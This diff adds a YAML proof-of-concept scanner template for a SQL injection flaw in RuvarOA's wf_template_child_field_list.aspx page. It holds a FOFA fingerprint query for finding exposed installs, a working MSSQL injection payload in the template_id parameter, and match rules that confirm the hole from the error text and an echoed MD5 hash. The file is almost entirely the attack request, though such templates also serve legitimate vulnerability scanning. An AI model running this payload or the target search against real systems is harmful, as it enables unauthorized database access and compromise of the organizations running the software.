@@ -1,0 +1,17 @@
+id: poc-yaml-ruvaroa-wf-template-child-field-list-sqli
+info:
+  name: RuvarOA wf_template_child_field_list SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ruvar-oa
+  fofa: body="txt_admin_key"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /SysManage/wf_template_child_field_list.aspx?template_id=%28-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+%29
+  expression: "status_code == 500 && \ncontains(body,\"[Exception]:\") &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,\"RuvarOA\") &&\ncontains(body,\"0x\" + t2)\n"
+transport: http
